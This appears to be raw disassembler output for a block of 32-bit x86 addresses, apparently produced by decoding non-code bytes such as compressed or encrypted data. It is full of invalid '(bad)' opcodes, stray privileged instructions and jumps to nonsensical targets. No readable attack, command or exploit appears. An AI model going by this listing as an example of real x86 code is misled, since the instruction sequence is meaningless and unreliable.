  43739a:	and    dl,bl
  43739c:	adc    DWORD PTR [ebx+0x39],0x40b051cb
  4373a3:	jle    0x4373e7
  4373a5:	add    BYTE PTR [ecx],al
  4373a7:	(bad)  
  4373a8:	xchg   edx,eax
  4373a9:	enter  0x7e01,0xb3
  4373ad:	(bad)  
  4373ae:	xlat   BYTE PTR ds:[ebx]
  4373af:	shl    bh,cl
  4373b1:	enter  0x7e9b,0xf6
  4373b5:	jle    0x4373b3
  4373b7:	mov    edi,0x36e90011
  4373bc:	ds leave 
  4373be:	repz jmp 0x4373c1
	...
  4373dd:	add    BYTE PTR [ebx],bl
  4373df:	inc    eax
  4373e0:	jmp    0x603bc563
  4373e5:	dec    eax
  4373e6:	test   eax,0x62d2ea74
  4373eb:	outs   dx,DWORD PTR ds:[esi]
  4373ec:	out    0x3,eax
  4373ee:	or     eax,0x2ae01b7b
  4373f3:	adc    BYTE PTR [esp+eax*1],dh
  4373f6:	or     eax,0xa52bed56
  4373fb:	lea    ebp,[ebx-0x2e]
  4373fe:	xchg   DWORD PTR [ebx+0xe0e58a8],eax
  437404:	test   eax,0xe8ff83dc
  437409:	add    ecx,DWORD PTR [edx+0x15587a01]
  43740f:	jne    0x437479
  437411:	or     DWORD PTR ds:0xc986e900,0xffffffc7
  437418:	popa   
  437419:	xor    BYTE PTR [ecx+0x441f50cf],0xca
  437420:	push   ecx
  437421:	xchg   DWORD PTR [edx-0x3e2dd4ad],eax
  437427:	iret   
  437428:	ins    DWORD PTR es:[edi],dx
  437429:	dec    eax
  43742a:	cmp    edi,edx
  43742c:	(bad)  
  43742d:	aas    
  43742e:	or     eax,0x73fa0000
  437433:	ja     0x437479
  437435:	inc    ecx
  437436:	or     ecx,DWORD PTR [ecx-0x379588f6]
  43743c:	cli    
  43743d:	jmp    0x1376f8cf
	...
  43745e:	add    BYTE PTR [eax],al
  437460:	(bad)  
  437462:	out    0x50,eax
  437464:	cmp    eax,DWORD PTR [eax]
  437466:	add    BYTE PTR [edx+0x4d],dh
  437469:	shl    BYTE PTR [ebp-0x18],1
  43746c:	lea    edi,[esp+ecx*8-0x9]
  437470:	mov    esp,0x45624fca
  437475:	int3   
  437476:	es sub al,0xb1
  437479:	fistp  QWORD PTR [eax-0x7]
  43747c:	(bad)  
  43747e:	xchg   cl,dl
  437480:	adc    bh,cl
  437482:	jae    0x4374d1
  437484:	cmp    BYTE PTR [edx],al
  437486:	xchg   DWORD PTR [ecx],ebp
  437488:	mov    ebp,0x18b95c78
  43748d:	cmp    eax,0x47173dec
  437492:	dec    ebp
  437493:	mov    cl,0xbc
  437495:	ficomp WORD PTR [ebx+0x3a]
  437498:	xor    DWORD PTR [eax+0x330ee8ff],edi
  43749e:	call   0xfb0df895
  4374a3:	rcl    BYTE PTR [ecx+0x53],cl
  4374a6:	add    eax,0x74f426c0
  4374ab:	(bad)  [ecx]
  4374ad:	pop    esi
  4374ae:	fs push ds
  4374b0:	inc    ecx
  4374b1:	clc    
  4374b2:	or     al,0x6e
  4374b4:	cmp    al,0xe
  4374b6:	mov    edi,0x580858dd
  4374bb:	in     eax,dx
  4374bc:	loop   0x4374b2
  4374be:	push   edx
  4374bf:	bound  edx,QWORD PTR [edi-0x21]
  4374c2:	fcom   DWORD PTR [ecx+0x0]
	...
  4374e1:	add    BYTE PTR [edx+ecx*8-0x78],bl
  4374e5:	add    BYTE PTR [ecx-0x45],ah
  4374e8:	loope  0x437512
  4374ea:	lahf   
  4374eb:	mov    ecx,0xb0d907e2
  4374f0:	cmc    
  4374f1:	push   ebx
  4374f2:	dec    esp
  4374f3:	pop    edx
  4374f4:	sti    
  4374f5:	jmp    DWORD PTR [esp+ebp*8]
  4374f8:	mov    edi,0xf8d2e3e8
  4374fd:	inc    edi
  4374ff:	sub    bl,BYTE PTR [eax+0x2b02e400]
  437505:	rcr    BYTE PTR [esi+eiz*8],0xf
  437509:	(bad)  
  43750a:	jmp    0x4374c3
  43750c:	inc    ebx
  43750d:	clc    
  43750e:	cmc    
  43750f:	add    al,BYTE PTR [eax]
  437511:	add    bl,ch
  437513:	out    0xe7,eax
  437515:	pop    esp
  437516:	retf   
  437517:	scas   eax,DWORD PTR es:[edi]
  437518:	cmc    
  437519:	push   edi
  43751a:	fmul   QWORD PTR [eax]
  43751c:	xlat   BYTE PTR ds:[ebx]
  43751d:	(bad)  
  43751e:	fld    TBYTE PTR [edi+0x40ccf073]
  437524:	xlat   BYTE PTR ds:[ebx]
  437525:	dec    ebx
  437527:	inc    ebx
  437528:	add    edi,edi
  43752a:	loope  0x4374df
  43752c:	or     DWORD PTR [ebp-0x54],0xa5807b43
  437533:	add    al,BYTE PTR [eax]
  437535:	call   0x3f3069
  43753a:	addr16 ret 0x7d79
  43753e:	pushf  
  43753f:	add    DWORD PTR [edi],eax
  437541:	xchg   esp,eax
  437542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437543:	rcpps  xmm1,xmm1
	...
  437562:	add    BYTE PTR [eax],al
  437564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437565:	(bad)  
  437566:	jmp    FWORD PTR [ecx+0x40]
  437569:	stos   BYTE PTR es:[edi],al
  43756a:	cmc    
  43756b:	pop    es
  43756c:	je     0x437570
  43756e:	push   eax
  43756f:	lea    esi,[ebx]
  437571:	clc    
  437572:	dec    edi
  437573:	call   DWORD PTR [ecx+0x1a]
  437576:	push   cs
  437577:	inc    eax
  437578:	xor    al,0x7b
  43757a:	mov    esi,0xbf540d0c
  43757f:	jae    0x437593
  437581:	jmp    0x437546
  437583:	call   0x424dd3
  437588:	sbb    cl,BYTE PTR [esi+0x48]
  43758b:	sbb    al,0xbe
  43758d:	arpl   WORD PTR [ebx],dx
  43758f:	in     eax,dx
  437590:	ret    
  437591:	mov    esi,0x8499c50b
  437596:	jnp    0x4375e3
  437598:	xor    edi,eax
  43759a:	jnp    0x4375a4
  43759c:	imul   esi,DWORD PTR [eax-0x28f3e483],0xfffffffe
  4375a3:	je     0x4375ed
  4375a5:	jno    0x4375a4
  4375a7:	out    0x9d,eax
  4375a9:	push   ebp
  4375aa:	sar    dl,1
  4375ac:	xchg   esi,eax
  4375ad:	mov    DWORD PTR [esi],0x58f61f5
  4375b3:	sub    dl,BYTE PTR [ebx-0x13]
  4375b6:	sbb    BYTE PTR [ecx+0x11],0x5a
  4375ba:	inc    edi
  4375bb:	add    al,0x1d
  4375bd:	and    al,0xf1
  4375bf:	xchg   BYTE PTR [esi],cl
  4375c1:	pop    esp
  4375c2:	les    esi,FWORD PTR [ebx+0x1a]
  4375c5:	pop    edx
  4375c6:	les    eax,FWORD PTR [ebx]
	...
  4375e4:	add    BYTE PTR [eax],al
  4375e6:	aaa    
  4375e7:	fld    TBYTE PTR [esi]
  4375e9:	lea    ecx,[edx-0x51]
  4375ec:	cs sti 
  4375ee:	add    bh,ch
  4375f0:	icebp  
  4375f1:	aas    
  4375f2:	or     eax,0x900bc85a
  4375f7:	xchg   edi,eax
  4375f8:	push   edi
  4375f9:	jne    0x4375c3
  4375fb:	pop    ecx
  4375fc:	mov    edi,0x4a853607
  437601:	aad    0xdb
  437603:	outs   dx,BYTE PTR ds:[esi]
  437604:	xchg   ebp,eax
  437605:	fldcw  WORD PTR [edx+0x46]
  437608:	sti    
  437609:	mov    dl,0xca
  43760b:	mov    esp,0x91f3ed0d
  437610:	(bad)  
  437611:	jae    0x4375cc
  437613:	jmp    FWORD PTR [ebp+0x40]
  437616:	icebp  
  437617:	out    dx,eax
  437618:	ins    DWORD PTR es:[edi],dx
  437619:	std    
  43761a:	lods   al,BYTE PTR ds:[esi]
  43761b:	push   es
  43761c:	push   0xe9000dee
  437621:	pop    eax
  437622:	enter  0xe759,0xdb
  437626:	mov    ebp,0x8bcf3975
  43762b:	shr    ch,1
  43762d:	fcomp  DWORD PTR [esi-0x68e20ff9]
  437633:	adc    eax,0x81112e74
  437638:	popf   
  437639:	pop    es
  43763a:	and    DWORD PTR [ebx-0xc],ecx
  43763d:	jp     0x43763a
  43763f:	jnp    0x437669
  437641:	pop    eax
  437642:	push   ds
  437643:	sub    DWORD PTR [eax],0x98f070fc
  437649:	add    BYTE PTR [eax],0x0
	...
  437668:	dec    edi
  437669:	out    0x98,al
  43766b:	into   
  43766c:	add    DWORD PTR [eax],ebp
  43766e:	rol    DWORD PTR [ebx+0xd],cl
  437671:	sub    DWORD PTR [edi+edi*8-0x9ab406f],0xfba58149
  43767c:	add    edx,DWORD PTR [esi]
  43767e:	dec    ebp
  43767f:	mov    ecx,0xae2dd85c
  437684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437685:	(bad)  
  437686:	test   bl,0x44
  437689:	and    ecx,DWORD PTR [esi]
  43768b:	ret    0xe
  43768e:	adc    ebx,esp
  437690:	shl    DWORD PTR [ebp-0x145315f],1
  437696:	(bad)  
  437697:	rcr    ecx,cl
  437699:	js     0x43761f
  43769b:	and    BYTE PTR [esi-0x15],0x65
  43769f:	push   0x7b19ff79
  4376a4:	in     al,0xfb
  4376a6:	arpl   si,cx
  4376a8:	pop    ss
  4376a9:	jbe    0x4376aa
  4376ab:	push   eax
  4376ac:	push   cs
  4376ad:	add    BYTE PTR [eax],al
  4376af:	push   0xffffffe5
  4376b1:	(bad)  
  4376b2:	(bad)  
  4376b3:	mov    ecx,0x265707e4
  4376b8:	aad    0xcf
  4376ba:	add    cl,ch
  4376bc:	push   cs
  4376bd:	add    BYTE PTR [ecx+0x17d52ac],cl
  4376c3:	jmp    0x15:0x5fe7c7d5
  4376ca:	add    BYTE PTR [ebp+0x0],ch
	...
  4376e9:	add    BYTE PTR [esi+0x4b],cl
  4376ec:	sbb    BYTE PTR [edx-0x3b],ah
  4376ef:	retf   
  4376f0:	xchg   BYTE PTR [edi],dh
  4376f2:	out    0xbf,al
  4376f4:	add    ebp,ecx
  4376f6:	push   cs
  4376f7:	(bad)  
  4376f8:	dec    esp
  4376f9:	sbb    eax,0xc0f034cb
  4376fe:	cmp    eax,0xd6a428d4
  437703:	fiadd  DWORD PTR [edx+0x72]
  437706:	push   ebp
  437707:	ror    BYTE PTR [eax-0x3cf53554],1
  43770d:	ins    BYTE PTR es:[edi],dx
  43770e:	std    
  43770f:	jp     0x43778d
  437711:	aad    0x44
  437713:	add    DWORD PTR [edi+0x4b74d12c],eax
  437719:	call   0x3857d4d4
  43771e:	xor    bh,BYTE PTR [edi]
  437720:	add    esi,ecx
  437722:	faddp  st(6),st
  437724:	adc    al,0x21
  437726:	fwait
  437727:	add    eax,DWORD PTR [eax]
  437729:	push   0xffffffc5
  43772b:	test   DWORD PTR [ecx+ebp*4+0x2c86f73a],0x91c97a5d
  437736:	mov    ?,edi
  437738:	(bad)  
  437739:	call   0xc33fab87
  43773e:	inc    ebp
  43773f:	mov    BYTE PTR [eax+eax*1-0x70],0x49
  437744:	inc    esp
  437745:	cld    
  437746:	ja     0x437700
  437748:	xor    DWORD PTR [esi+0x68],eax
  43774b:	xor    edi,DWORD PTR [esi+0xff]
	...
  437769:	add    BYTE PTR [eax],al
  43776b:	add    BYTE PTR [ecx],ch
  43776d:	test   al,0x81
  43776f:	jle    0x4377a9
  437771:	mov    ah,0x43
  437773:	lock xor eax,0x8101ec12
  437779:	mov    bh,0x37
  43777b:	jge    0x437755
  43777d:	les    eax,FWORD PTR [esi-0xa4b2c85]
  437783:	pop    ebx
  437784:	add    DWORD PTR [esi-0x5450a947],0xffffff81
  43778b:	(bad)  
  43778c:	int3   
  43778d:	retf   0x3
  437790:	hlt    
  437791:	jp     0x43774d
  437793:	je     0x437798
  437795:	inc    edx
  437796:	or     BYTE PTR ds:[esi+eiz*4-0x11bfb38],dh
  43779e:	test   al,al
  4377a0:	(bad)  
  4377a1:	rol    BYTE PTR [ecx-0x1d7da039],1
  4377a7:	dec    edi
  4377a8:	in     eax,0xfe
  4377aa:	inc    DWORD PTR [ebx+0x33052b24]
  4377b0:	je     0x4377f0
  4377b2:	push   esi
  4377b3:	ret    
  4377b4:	daa    
  4377b5:	mov    esp,0x48f9c358
  4377ba:	out    0x51,eax
  4377bc:	test   DWORD PTR [ecx],0xaff98d4f
  4377c2:	dec    edx
  4377c3:	call   0x3c4223
  4377c8:	das    
  4377c9:	mov    bh,0x29
  4377cb:	neg    BYTE PTR [edi+0x3c6eb4]
	...
  4377ed:	add    bh,bh
  4377ef:	adc    esp,edi
  4377f1:	sub    DWORD PTR [edi+0xd347bfd],0xffffffff
  4377f8:	sti    
  4377f9:	out    0x1d,eax
  4377fb:	xchg   esp,eax
  4377fc:	retf   
  4377fd:	cli    
  4377fe:	es xchg ebx,eax
  437800:	push   edx
  437801:	add    edx,DWORD PTR [eax+ecx*4+0x5e116f75]
  437808:	iret   
  437809:	test   BYTE PTR [ebx-0x34],bl
  43780c:	in     al,dx
  43780d:	mov    BYTE PTR [ebx],cl
  43780f:	push   eax
  437810:	sub    eax,0xcd023504
  437815:	cli    
  437816:	cmp    dl,BYTE PTR [ebp+0x4d]
  437819:	add    al,0xc
  43781b:	mov    ah,0xf8
  43781d:	cli    
  43781e:	jecxz  0x437850
  437820:	stc    
  437821:	fsub   QWORD PTR [edx]
  437823:	add    DWORD PTR ds:0xc55e10e7,esi
  437829:	out    0x5,al
  43782b:	push   0xffffffd6
  43782d:	cld    
  43782e:	jmp    0xcd72444d
  437833:	sub    BYTE PTR [edi+edx*2],0xc4
  437837:	push   ss
  437838:	js     0x43787a
  43783a:	or     DWORD PTR [esi-0xa],ebx
  43783d:	dec    esi
  43783e:	inc    ebx
  43783f:	bound  eax,QWORD PTR [ecx-0x7e79a638]
  437845:	mov    edi,0xc057ba61
  43784a:	adc    eax,0x5c52c75e
  43784f:	scas   eax,DWORD PTR es:[edi]
  437850:	cmp    ebx,ebp
	...
  43786e:	add    BYTE PTR [eax],al
  437870:	ret    0x7aa2
  437873:	out    dx,eax
  437874:	nop
  437875:	mov    eax,ds:0x96ff0450
  43787a:	fisub  DWORD PTR [edx]
  43787c:	inc    ebx
  43787d:	das    
  43787e:	outs   dx,BYTE PTR ds:[esi]
  43787f:	jmp    DWORD PTR [edx-0x5a3d8629]
  437885:	push   esi
  437886:	stc    
  437887:	stc    
  437888:	xchg   edx,eax
  437889:	jmp    0xb95007
  43788e:	pop    esi
  43788f:	test   al,0x87
  437891:	shr    DWORD PTR [esi-0x39],0x73
  437895:	repnz inc BYTE PTR [ebx]
  437898:	in     eax,0x69
  43789a:	call   0xa95085a2
  43789f:	fdivr  st(5),st
  4378a1:	bnd jp 0x43786f
  4378a4:	mov    bh,0x21
  4378a6:	push   cs
  4378a7:	(bad)  
  4378a8:	mov    ecx,0xda357c74
  4378ad:	sub    BYTE PTR [esi],dl
  4378af:	retf   
  4378b0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4378b2:	outs   dx,DWORD PTR ds:[esi]
  4378b3:	dec    ecx
  4378b4:	cmp    DWORD PTR [edi],eax
  4378b6:	sar    edi,cl
  4378b8:	mov    ah,0x12
  4378ba:	pop    esi
  4378bb:	add    ch,BYTE PTR [edx]
  4378bd:	mov    edx,0x1f9a86ca
  4378c2:	jmp    0xed996d18
  4378c7:	xchg   BYTE PTR [edx-0x1c],dl
  4378ca:	cwde   
  4378cb:	retf   0xf881
  4378ce:	and    ecx,esi
  4378d0:	pop    edx
  4378d1:	jmp    0x0:0x3a8
	...
  4378f0:	add    BYTE PTR [eax],al
  4378f2:	jp     0x4378b0
  4378f4:	in     al,0x80
  4378f6:	mov    dl,0x4a
  4378f8:	out    0xca,al
  4378fa:	push   ecx
  4378fb:	les    esp,FWORD PTR [ebp-0x41f8307a]
  437901:	sub    DWORD PTR [ecx],edx
  437903:	inc    esp
  437904:	push   ss
  437905:	jg     0x437950
  437907:	les    ecx,FWORD PTR [ecx-0x13422bd2]
  43790d:	add    ebx,DWORD PTR [eax+0x75]
  437910:	int3   
  437911:	xor    al,0x4a
  437913:	sub    DWORD PTR [esi],edx
  437915:	retf   
  437916:	jecxz  0x4378bc
  437918:	pop    edi
  437919:	dec    eax
  43791a:	test   eax,0x27004306
  43791f:	adc    ebp,DWORD PTR [esi+0x1]
  437922:	call   0x3448:0x8a4effb9
  437929:	jmp    0xf9a9600a
  43792e:	mov    eax,DWORD PTR [eax+0x4b463923]
  437934:	or     BYTE PTR [esi+0x2912287d],dl
  43793a:	adc    DWORD PTR [ecx-0x3c],eax
  43793d:	cmc    
  43793e:	lea    eax,[eax+0x3b47ea74]
  437944:	cld    
  437945:	sub    cl,BYTE PTR [edx-0xb4dc843]
  43794b:	sti    
  43794c:	jnp    0x437988
  43794e:	ret    
  43794f:	cmp    edi,esp
  437951:	mov    esi,0xedbdb6eb
	...
  437972:	add    BYTE PTR [eax],al
  437974:	push   cs
  437975:	cs push ebx
  437977:	bound  edx,QWORD PTR [esi+0x73]
  43797a:	inc    edx
  43797b:	in     eax,0xa3
  43797d:	iret   
  43797e:	dec    edi
  43797f:	push   ecx
  437980:	mov    cl,0xc4
  437982:	cli    
  437983:	ss mov ecx,eax
  437986:	std    
  437987:	stos   DWORD PTR es:[edi],eax
  437988:	add    BYTE PTR [edi],bh
  43798a:	ret    
  43798b:	int    0x3f
  43798d:	test   al,0x96
  43798f:	push   ds
  437990:	(bad)  
  437991:	mov    edx,0x3d08117e
  437996:	add    al,0xda
  437998:	into   
  437999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43799a:	(bad)  
  43799b:	mov    ecx,0x9f5affce
  4379a0:	rol    DWORD PTR [esi-0x792932bd],cl
  4379a6:	dec    ebx
  4379a7:	(bad)
  4379aa:	aas    
  4379ab:	in     eax,dx
  4379ac:	inc    ecx
  4379ad:	dec    eax
  4379ae:	add    al,0x22
  4379b0:	into   
  4379b1:	xor    al,0xff
  4379b3:	sbb    ecx,ecx
  4379b5:	jle    0x4379cd
  4379b7:	test   eax,0xf9df90
  4379bc:	hlt    
  4379bd:	les    esp,FWORD PTR [eax+eax*1+0x3c]
  4379c1:	mov    edx,0x5da442a3
  4379c6:	cmp    bh,bh
  4379c8:	inc    esp
  4379c9:	add    bh,dh
  4379cb:	xor    BYTE PTR [ebp+esi*8-0x7b9bff3c],bl
  4379d2:	mov    esi,0x3f3da714
  4379d7:	and    al,0x0
	...
  4379f5:	add    BYTE PTR [eax+0x3c],cl
  4379f8:	inc    edi
  4379f9:	and    al,0x5c
  4379fb:	icebp  
  4379fc:	xor    BYTE PTR [eax+edx*2-0x45],0xf5
  437a01:	ss out 0xc3,eax
  437a04:	add    dl,BYTE PTR [eax-0x49]
  437a07:	ret    0xe802
  437a0a:	sub    DWORD PTR [eax+eax*1],eax
  437a0d:	add    BYTE PTR [ecx+ecx*2+0x4e7a0004],ah
  437a14:	cli    
  437a15:	neg    ah
  437a17:	les    edx,FWORD PTR [ebx-0x75]
  437a1a:	mov    eax,0x8210e684
  437a1f:	cmp    al,0xeb
  437a21:	mov    ebp,DWORD PTR [edx-0x41]
  437a24:	dec    ebp
  437a25:	mov    edi,DWORD PTR [ecx-0xfb10646]
  437a2b:	pop    ebx
  437a2c:	leave  
  437a2d:	cmp    BYTE PTR [eax+edx*4],bl
  437a30:	aam    0xff
  437a32:	sbb    eax,DWORD PTR [eax+0x2f700fba]
  437a38:	sti    
  437a39:	push   esp
  437a3b:	cmp    eax,DWORD PTR [ecx+0x4]
  437a3e:	ja     0x437a53
  437a40:	ror    DWORD PTR [ecx+0x5d87d2a1],cl
  437a46:	ror    BYTE PTR [ecx],0x57
  437a49:	add    al,0x2a
  437a4b:	push   edx
  437a4c:	mov    DWORD PTR [ebp-0x54],ebx
  437a4f:	(bad)  
  437a51:	xor    cl,BYTE PTR ds:0xe3a7b72
  437a57:	dec    esp
  437a58:	int3   
  437a59:	mov    BYTE PTR [eax],al
	...
  437a77:	add    BYTE PTR [eax-0x3b],al
  437a7a:	add    eax,0x1bfe9d5d
  437a7f:	xchg   DWORD PTR [ebx],ecx
  437a81:	and    al,0x3b
  437a83:	call   DWORD PTR [edx]
  437a85:	inc    ebx
  437a86:	lock dec edi
  437a88:	nop
  437a89:	in     eax,dx
  437a8a:	sti    
  437a8b:	dec    edi
  437a8c:	jp     0x437a41
  437a8e:	es adc cl,ch
  437a91:	test   al,0x83
  437a93:	ret    
  437a94:	sbb    DWORD PTR [edi+edi*4],esp
  437a97:	jae    0x437a5a
  437a99:	test   DWORD PTR [ecx],edi
  437a9b:	cld    
  437a9c:	xchg   bl,ah
  437a9e:	(bad)  
  437a9f:	jle    0x437aef
  437aa1:	jo     0x437aae
  437aa3:	inc    ebp
  437aa4:	cmp    eax,0x4a86a6ac
  437aa9:	xor    DWORD PTR [ecx-0x37a1f119],edi
  437aaf:	cli    
  437ab0:	mov    eax,ebp
  437ab2:	dec    ecx
  437ab3:	pop    ss
  437ab4:	xchg   esi,eax
  437ab5:	sahf   
  437ab6:	cli    
  437ab7:	xchg   BYTE PTR [ecx+edx*8-0x42],cl
  437abb:	aaa    
  437abc:	push   cs
  437abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437abe:	pop    esp
  437abf:	cmp    ah,cl
  437ac1:	popf   
  437ac2:	mov    DWORD PTR cs:[ebx-0x5d],ebx
  437ac6:	(bad)  
  437ac7:	adc    al,0x51
  437ac9:	mov    ebp,0xe38e003e
  437ace:	repnz cli 
  437ad0:	dec    eax
  437ad1:	sbb    edi,DWORD PTR [esp+edi*2+0x15]
  437ad5:	and    bh,BYTE PTR [edx]
  437ad7:	hlt    
  437ad8:	mov    gs,WORD PTR [esi+eax*8+0x37]
	...
  437af8:	add    BYTE PTR [eax],al
  437afa:	push   ss
  437afb:	data16 cli 
  437afd:	jnp    0x437a81
  437aff:	and    bh,BYTE PTR [ecx]
  437b01:	add    al,0x36
  437b03:	loopne 0x437b0b
  437b05:	call   0xc8027b31
  437b0a:	mov    bh,0x70
  437b0c:	out    0x2a,eax
  437b0e:	push   esi
  437b0f:	pop    esi
  437b10:	mov    al,ds:0x5e000ec2
  437b15:	inc    ecx
  437b16:	mov    eax,ds:0x724ca883
  437b1b:	sub    ch,cl
  437b1d:	sub    eax,0x3e868a5
  437b22:	or     eax,0x6849fa9
  437b27:	in     al,0xec
  437b29:	add    ebx,edi
  437b2b:	push   esp
  437b2c:	outs   dx,BYTE PTR ds:[esi]
  437b2d:	int3   
  437b2e:	mov    ebp,DWORD PTR [edi+0x6372fc1c]
  437b34:	in     al,dx
  437b35:	add    ecx,DWORD PTR ds:0x92002987
  437b3b:	(bad)  
  437b3c:	nop
  437b3d:	out    0x51,al
  437b3f:	mov    ebp,0x338a8071
  437b44:	in     eax,0x11
  437b46:	dec    ebp
  437b47:	test   eax,0x3c47b13
  437b4c:	test   al,0x5a
  437b4e:	inc    esp
  437b4f:	clc    
  437b50:	inc    eax
  437b51:	mov    ah,0x45
  437b53:	mov    ebp,0x34628049
  437b58:	push   ebp
  437b59:	jnp    0x437b1f
  437b5b:	add    ebp,DWORD PTR [esi-0x3b]
	...
  437b7a:	add    BYTE PTR [eax],al
  437b7c:	stos   DWORD PTR es:[edi],eax
  437b7d:	mov    edi,0x2a0f02f0
  437b82:	icebp  
  437b83:	inc    esp
  437b84:	pop    esi
  437b85:	push   eax
  437b86:	jo     0x437bbe
  437b88:	adc    DWORD PTR [ebp+0x401f37f3],edi
  437b8e:	jmp    0x594f4a15
  437b93:	add    eax,0x275e46
  437b98:	or     eax,0x53d86e53
  437b9d:	lods   al,BYTE PTR ds:[esi]
  437b9e:	jmp    FWORD PTR [eax+0x25748af8]
  437ba4:	loope  0x437b3a
  437ba6:	(bad)  
  437ba7:	call   0xf19000ba
  437bac:	push   esp
  437bad:	inc    DWORD PTR [esi-0x5763951]
  437bb3:	into   
  437bb4:	retf   
  437bb5:	push   esi
  437bb6:	leave  
  437bb7:	stos   DWORD PTR es:[edi],eax
  437bb8:	call   0x86b5:0x161654bc
  437bbf:	mov    eax,0xe91bee66
  437bc4:	push   cs
  437bc5:	xchg   DWORD PTR [edx-0x13],eax
  437bc8:	idiv   DWORD PTR [ebp-0x19]
  437bcb:	dec    esi
  437bcc:	dec    edx
  437bcd:	mov    ecx,0x304e6dfa
  437bd2:	adc    al,0x2
  437bd4:	push   ebx
  437bd5:	hlt    
  437bd6:	(bad)  
  437bd7:	mov    ecx,0x1752f7b4
  437bdc:	dec    edx
  437bdd:	adc    ecx,DWORD PTR [edi+ebx*8+0x0]
	...
  437bfd:	add    dh,cl
  437bff:	(bad)  
  437c00:	jle    0x437ba7
  437c02:	cmp    ch,BYTE PTR [eax+eax*1-0x3a]
  437c06:	lock jl 0x437c5d
  437c09:	jb     0x437c65
  437c0b:	dec    edi
  437c0c:	xchg   DWORD PTR [esi+eiz*1+0xe11c025],esp
  437c13:	jmp    DWORD PTR [ecx+0x6a]
  437c16:	rcr    edi,cl
  437c18:	call   FWORD PTR [ecx+0x2fd784e0]
  437c1e:	dec    ebp
  437c1f:	mov    bh,0xff
  437c21:	mov    ah,0x28
  437c23:	and    al,BYTE PTR [esp+esi*2]
  437c26:	dec    ebx
  437c27:	sbb    al,0x8d
  437c29:	stos   BYTE PTR es:[edi],al
  437c2a:	jmp    0x1253:0xdd165051
  437c31:	test   eax,0xc43b0e
  437c36:	loopne 0x437bb8
  437c38:	mov    edx,0x82edc374
  437c3d:	jne    0x437beb
  437c3f:	xlat   BYTE PTR ds:[ebx]
  437c40:	ss std 
  437c42:	mov    bl,0xc5
  437c44:	jns    0x437c3e
  437c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437c47:	mov    ah,0x9b
  437c49:	shr    BYTE PTR [eax],0xc4
  437c4c:	jae    0x437c82
  437c4e:	cld    
  437c4f:	cli    
  437c50:	or     esi,DWORD PTR [ebp-0x59]
  437c53:	pop    ecx
  437c54:	add    al,0x8d
  437c56:	jmp    0x437bff
  437c58:	dec    edx
  437c59:	(bad)  
  437c5a:	out    0xa7,eax
  437c5c:	dec    edx
  437c5d:	jmp    FWORD PTR [ecx-0xd]
  437c60:	or     eax,0x40
	...
  437c7d:	add    BYTE PTR [eax],al
  437c7f:	add    BYTE PTR [eax+eax*4-0x42],dh
  437c83:	or     al,0xaa
  437c85:	sti    
  437c86:	test   BYTE PTR [ecx],0x63
  437c89:	mov    WORD PTR ds:0x3b071a20,?
  437c8f:	and    al,bh
  437c91:	mov    cl,0x7a
  437c93:	jge    0x437cf5
  437c95:	push   DWORD PTR [esp+eax*1+0xa]
  437c99:	aaa    
  437c9a:	cmp    ah,BYTE PTR [eax]
  437c9c:	jp     0x437c99
  437c9e:	test   BYTE PTR [ecx],0xa
  437ca1:	xor    DWORD PTR [ebp+0x34],0x6a564b24
  437ca8:	xor    al,0x32
  437caa:	outs   dx,BYTE PTR ds:[esi]
  437cab:	and    al,0xb1
  437cad:	inc    eax
  437cae:	and    al,0x56
  437cb0:	les    edx,FWORD PTR fs:[ebx]
  437cb3:	pop    eax
  437cb4:	cmp    bh,BYTE PTR [edi]
  437cb6:	add    BYTE PTR [ebx-0x3f7c4818],al
  437cbc:	enter  0x4e13,0x8b
  437cc0:	mov    ecx,0x311fe2b6
  437cc5:	(bad)
  437cc8:	sub    al,0xfe
  437cca:	push   es
  437ccb:	popf   
  437ccc:	or     eax,0x58bf7fe9
  437cd1:	aad    0x6
  437cd3:	inc    ebp
  437cd4:	or     DWORD PTR [eax+esi*8],edi
  437cd7:	gs std 
  437cd9:	sub    edi,DWORD PTR ds:0x41245d24
  437cdf:	and    al,0x5d
  437ce1:	stos   BYTE PTR es:[edi],al
  437ce2:	jmp    0x437d32
	...
  437cff:	add    BYTE PTR [eax],al
  437d01:	add    BYTE PTR [ebx],ah
  437d03:	jmp    0xad0cfc0b
  437d08:	mov    esp,0xf3a7aa44
  437d0d:	mov    dl,0x4a
  437d0f:	adc    eax,0xbd4e395a
  437d14:	dec    edx
  437d15:	or     cl,BYTE PTR [ebp+0x1fff7fb]
  437d1b:	lods   eax,DWORD PTR ds:[esi]
  437d1c:	pop    esp
  437d1d:	mov    esi,ecx
  437d1f:	mov    ah,0xbc
  437d21:	inc    esp
  437d22:	jp     0x437ccb
  437d24:	js     0x437d6a
  437d26:	jb     0x437d22
  437d28:	sub    cl,cl
  437d2a:	dec    edi
  437d2b:	mov    al,ds:0xd04d66fe
  437d30:	sub    al,0x87
  437d32:	pop    esp
  437d33:	sub    eax,0xa7f98cf5
  437d38:	ja     0x437d7b
  437d3a:	adc    esi,edi
  437d3c:	ret    
  437d3d:	aaa    
  437d3e:	push   cs
  437d3f:	push   0xadbfd107
  437d44:	jno    0x437d8b
  437d46:	cmc    
  437d47:	jbe    0x437d1f
  437d49:	push   ecx
  437d4a:	inc    edi
  437d4b:	push   ecx
  437d4c:	(bad)  
  437d4d:	out    0xf,al
  437d4f:	pop    ss
  437d50:	les    eax,FWORD PTR [ebx-0x50b83b3]
  437d56:	ret    
  437d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437d58:	ja     0x437da3
  437d5a:	adc    DWORD PTR [esi-0x530ac84b],edi
  437d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437d61:	cli    
  437d62:	cli    
  437d63:	add    bl,al
  437d65:	rol    BYTE PTR [eax],0x0
	...
  437d84:	pop    ecx
  437d85:	test   DWORD PTR [eax+edi*2],ecx
  437d88:	pop    ecx
  437d89:	or     BYTE PTR [esi-0x29],ah
  437d8c:	sub    cl,BYTE PTR [ebp-0x4e]
  437d8f:	jbe    0x437dd2
  437d91:	fcom   DWORD PTR [eax]
  437d93:	xchg   ecx,eax
  437d94:	sar    BYTE PTR [ecx-0x81def18],cl
  437d9a:	xchg   edx,eax
